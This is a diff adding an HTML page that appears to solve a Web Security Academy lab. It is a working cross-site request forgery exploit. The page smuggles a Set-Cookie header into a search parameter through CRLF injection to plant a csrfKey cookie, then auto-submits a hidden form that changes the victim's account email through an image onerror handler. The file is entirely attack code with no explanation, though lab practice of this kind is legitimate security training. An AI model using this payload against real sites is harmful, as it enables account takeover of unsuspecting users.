@@ -1,0 +1,12 @@
+<html>
+  <!-- Use CRLF to inject csrf key in cookies via search finction -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://0ad50049045b7e9b80f06c15000f0087.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="new&#64;fd&#46;net" />
+      <input type="hidden" name="csrf" value="edYKksdLlpk8ocl2bjJIywlenBOnSyhh" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <img src="/?search=test%0d%0aSet-Cookie:%20csrfKey=PZVzBz4Dq3A5WGLlgSBW7sbLddnjGkoR%3b%20SameSite=None" onerror="document.forms[0].submit();">
+  </body>
+</html>
